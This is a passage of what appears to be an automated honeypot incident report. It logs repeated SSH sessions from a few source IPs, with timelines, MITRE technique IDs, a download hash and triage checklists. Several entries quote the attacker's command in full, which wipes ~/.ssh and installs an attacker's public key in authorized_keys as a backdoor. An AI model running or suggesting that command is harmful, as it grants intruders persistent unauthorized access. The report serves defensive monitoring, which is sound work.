| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:11 |
| **Last Seen** | 2026-06-15 01:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:11:42` | `cowrie.session.connect` |
| `2026-06-15 01:11:42` | `cowrie.client.version` |
| `2026-06-15 01:11:43` | `cowrie.client.kex` |
| `2026-06-15 01:11:43` | `cowrie.login.success` |
| `2026-06-15 01:11:43` | `cowrie.session.params` |
| `2026-06-15 01:11:43` | `cowrie.command.input` |
| `2026-06-15 01:11:43` | `cowrie.command.failed` |
| `2026-06-15 01:11:44` | `cowrie.log.closed` |
| `2026-06-15 01:11:44` | `cowrie.session.params` |
| `2026-06-15 01:11:44` | `cowrie.command.input` |
| `2026-06-15 01:11:44` | `cowrie.session.file_download` |
| `2026-06-15 01:11:44` | `cowrie.log.closed` |
| `2026-06-15 01:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-723a050f76a3

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:11 |
| **Last Seen** | 2026-06-15 01:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:11:46` | `cowrie.session.connect` |
| `2026-06-15 01:11:46` | `cowrie.client.version` |
| `2026-06-15 01:11:46` | `cowrie.client.kex` |
| `2026-06-15 01:11:47` | `cowrie.login.success` |
| `2026-06-15 01:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99954c5ea9f

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 01:12 |
| **Last Seen** | 2026-06-15 01:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:12:10` | `cowrie.session.connect` |
| `2026-06-15 01:12:10` | `cowrie.client.version` |
| `2026-06-15 01:12:10` | `cowrie.client.kex` |
| `2026-06-15 01:12:11` | `cowrie.login.success` |
| `2026-06-15 01:12:11` | `cowrie.session.params` |
| `2026-06-15 01:12:11` | `cowrie.command.input` |
| `2026-06-15 01:12:11` | `cowrie.command.failed` |
| `2026-06-15 01:12:11` | `cowrie.log.closed` |
| `2026-06-15 01:12:12` | `cowrie.session.params` |
| `2026-06-15 01:12:12` | `cowrie.command.input` |
| `2026-06-15 01:12:12` | `cowrie.session.file_download` |
| `2026-06-15 01:12:12` | `cowrie.log.closed` |
| `2026-06-15 01:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db2426c19cf0

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 01:12 |
| **Last Seen** | 2026-06-15 01:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:12:14` | `cowrie.session.connect` |
| `2026-06-15 01:12:14` | `cowrie.client.version` |
| `2026-06-15 01:12:14` | `cowrie.client.kex` |
| `2026-06-15 01:12:15` | `cowrie.login.success` |
| `2026-06-15 01:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17d24e4cbe41

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:12 |
| **Last Seen** | 2026-06-15 01:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:12:42` | `cowrie.session.connect` |
| `2026-06-15 01:12:42` | `cowrie.client.version` |
| `2026-06-15 01:12:42` | `cowrie.client.kex` |
| `2026-06-15 01:12:42` | `cowrie.login.success` |
| `2026-06-15 01:12:43` | `cowrie.session.params` |
| `2026-06-15 01:12:43` | `cowrie.command.input` |
| `2026-06-15 01:12:43` | `cowrie.command.failed` |
| `2026-06-15 01:12:43` | `cowrie.log.closed` |
| `2026-06-15 01:12:43` | `cowrie.session.params` |
| `2026-06-15 01:12:43` | `cowrie.command.input` |
| `2026-06-15 01:12:43` | `cowrie.session.file_download` |
| `2026-06-15 01:12:43` | `cowrie.log.closed` |
| `2026-06-15 01:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee13ce61e3f

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:12 |
| **Last Seen** | 2026-06-15 01:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:12:44` | `cowrie.session.connect` |
| `2026-06-15 01:12:44` | `cowrie.client.version` |
| `2026-06-15 01:12:44` | `cowrie.client.kex` |
| `2026-06-15 01:12:45` | `cowrie.login.success` |
| `2026-06-15 01:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-204b3ff018a9

| Field | Detail |
|---|---|
| **Source IP** | `110.14.190[.]217` |
| **First Seen** | 2026-06-15 01:13 |
| **Last Seen** | 2026-06-15 01:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:13:57` | `cowrie.session.connect` |
| `2026-06-15 01:13:57` | `cowrie.client.version` |
| `2026-06-15 01:13:57` | `cowrie.client.kex` |
| `2026-06-15 01:13:58` | `cowrie.login.success` |
| `2026-06-15 01:13:58` | `cowrie.session.params` |
| `2026-06-15 01:13:58` | `cowrie.command.input` |
| `2026-06-15 01:13:58` | `cowrie.command.failed` |
| `2026-06-15 01:13:59` | `cowrie.log.closed` |
| `2026-06-15 01:13:59` | `cowrie.session.params` |
| `2026-06-15 01:13:59` | `cowrie.command.input` |
| `2026-06-15 01:13:59` | `cowrie.session.file_download` |
| `2026-06-15 01:13:59` | `cowrie.log.closed` |
| `2026-06-15 01:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.14.190[.]217` to AbuseIPDB if not already reported
- [ ] Block `110.14.190[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eaed84ff1c7

| Field | Detail |
|---|---|
| **Source IP** | `110.14.190[.]217` |
| **First Seen** | 2026-06-15 01:14 |
| **Last Seen** | 2026-06-15 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:14:01` | `cowrie.session.connect` |
| `2026-06-15 01:14:01` | `cowrie.client.version` |
| `2026-06-15 01:14:01` | `cowrie.client.kex` |
| `2026-06-15 01:14:02` | `cowrie.login.success` |
| `2026-06-15 01:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.14.190[.]217` to AbuseIPDB if not already reported
- [ ] Block `110.14.190[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8490332f8a2f

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:15 |
| **Last Seen** | 2026-06-15 01:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:15:31` | `cowrie.session.connect` |
| `2026-06-15 01:15:31` | `cowrie.client.version` |
| `2026-06-15 01:15:31` | `cowrie.client.kex` |
| `2026-06-15 01:15:32` | `cowrie.login.success` |
| `2026-06-15 01:15:32` | `cowrie.session.params` |
| `2026-06-15 01:15:32` | `cowrie.command.input` |
| `2026-06-15 01:15:32` | `cowrie.command.failed` |
| `2026-06-15 01:15:32` | `cowrie.log.closed` |
| `2026-06-15 01:15:32` | `cowrie.session.params` |
| `2026-06-15 01:15:32` | `cowrie.command.input` |
| `2026-06-15 01:15:33` | `cowrie.session.file_download` |
| `2026-06-15 01:15:33` | `cowrie.log.closed` |
| `2026-06-15 01:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67dcc9ec453c

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:15 |
| **Last Seen** | 2026-06-15 01:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:15:35` | `cowrie.session.connect` |
| `2026-06-15 01:15:35` | `cowrie.client.version` |
| `2026-06-15 01:15:35` | `cowrie.client.kex` |
| `2026-06-15 01:15:35` | `cowrie.login.success` |
| `2026-06-15 01:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fce2e41ce43

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:18 |
| **Last Seen** | 2026-06-15 01:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:18:58` | `cowrie.session.connect` |
| `2026-06-15 01:18:58` | `cowrie.client.version` |
| `2026-06-15 01:18:58` | `cowrie.client.kex` |
| `2026-06-15 01:18:58` | `cowrie.login.success` |
| `2026-06-15 01:18:59` | `cowrie.session.params` |
| `2026-06-15 01:18:59` | `cowrie.command.input` |
| `2026-06-15 01:18:59` | `cowrie.command.failed` |
| `2026-06-15 01:18:59` | `cowrie.log.closed` |
| `2026-06-15 01:18:59` | `cowrie.session.params` |
| `2026-06-15 01:18:59` | `cowrie.command.input` |
| `2026-06-15 01:18:59` | `cowrie.session.file_download` |
| `2026-06-15 01:18:59` | `cowrie.log.closed` |
| `2026-06-15 01:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-071689e10131

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:19 |
| **Last Seen** | 2026-06-15 01:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:19:00` | `cowrie.session.connect` |
| `2026-06-15 01:19:00` | `cowrie.client.version` |
| `2026-06-15 01:19:00` | `cowrie.client.kex` |
| `2026-06-15 01:19:01` | `cowrie.login.success` |
| `2026-06-15 01:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea84732be667

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:19 |
| **Last Seen** | 2026-06-15 01:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:19:21` | `cowrie.session.connect` |
| `2026-06-15 01:19:21` | `cowrie.client.version` |
| `2026-06-15 01:19:21` | `cowrie.client.kex` |
| `2026-06-15 01:19:22` | `cowrie.login.success` |
| `2026-06-15 01:19:22` | `cowrie.session.params` |
| `2026-06-15 01:19:22` | `cowrie.command.input` |
| `2026-06-15 01:19:22` | `cowrie.command.failed` |
| `2026-06-15 01:19:22` | `cowrie.log.closed` |
| `2026-06-15 01:19:22` | `cowrie.session.params` |
| `2026-06-15 01:19:22` | `cowrie.command.input` |
| `2026-06-15 01:19:22` | `cowrie.session.file_download` |
| `2026-06-15 01:19:22` | `cowrie.log.closed` |
| `2026-06-15 01:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42291ff7a21f

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:19 |
| **Last Seen** | 2026-06-15 01:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:19:24` | `cowrie.session.connect` |
| `2026-06-15 01:19:24` | `cowrie.client.version` |
| `2026-06-15 01:19:25` | `cowrie.client.kex` |
| `2026-06-15 01:19:25` | `cowrie.login.success` |
| `2026-06-15 01:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2a134cc36eb

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:21 |
| **Last Seen** | 2026-06-15 01:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:21:15` | `cowrie.session.connect` |
| `2026-06-15 01:21:15` | `cowrie.client.version` |
| `2026-06-15 01:21:15` | `cowrie.client.kex` |
| `2026-06-15 01:21:16` | `cowrie.login.success` |
| `2026-06-15 01:21:16` | `cowrie.session.params` |
| `2026-06-15 01:21:16` | `cowrie.command.input` |
| `2026-06-15 01:21:16` | `cowrie.command.failed` |
| `2026-06-15 01:21:16` | `cowrie.log.closed` |
| `2026-06-15 01:21:17` | `cowrie.session.params` |
| `2026-06-15 01:21:17` | `cowrie.command.input` |
| `2026-06-15 01:21:17` | `cowrie.session.file_download` |
| `2026-06-15 01:21:17` | `cowrie.log.closed` |
| `2026-06-15 01:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dec5e59b48b

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:21 |
| **Last Seen** | 2026-06-15 01:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:21:19` | `cowrie.session.connect` |
| `2026-06-15 01:21:19` | `cowrie.client.version` |
| `2026-06-15 01:21:19` | `cowrie.client.kex` |
| `2026-06-15 01:21:20` | `cowrie.login.success` |
| `2026-06-15 01:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9acd5526578c

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 01:22 |
| **Last Seen** | 2026-06-15 01:22 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:22:41` | `cowrie.session.connect` |
| `2026-06-15 01:22:41` | `cowrie.client.version` |
